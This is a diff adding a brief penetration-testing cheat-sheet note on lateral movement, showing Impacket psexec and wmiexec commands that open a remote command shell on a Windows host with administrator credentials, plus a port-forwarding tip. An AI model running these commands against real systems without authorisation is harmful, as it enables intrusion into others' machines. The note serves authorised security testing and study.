@@ -1,0 +1,10 @@
+---
+tags: [ lateral, movement, psexec, wmiexec ]
+---
+
+# psexec, wmiexec
+## administrator is the user - Welcome1! is the password - 192.168.0.16 is the remote IP,
+## keep in mind, if you portfwd, you can use loopback address as the IP
+
+psexec.py 'administrator:Welcome1!@192.168.0.16' cmd   
+impacket-wmiexec 'administrator:Welcome1!@127.0.0.1' cmd
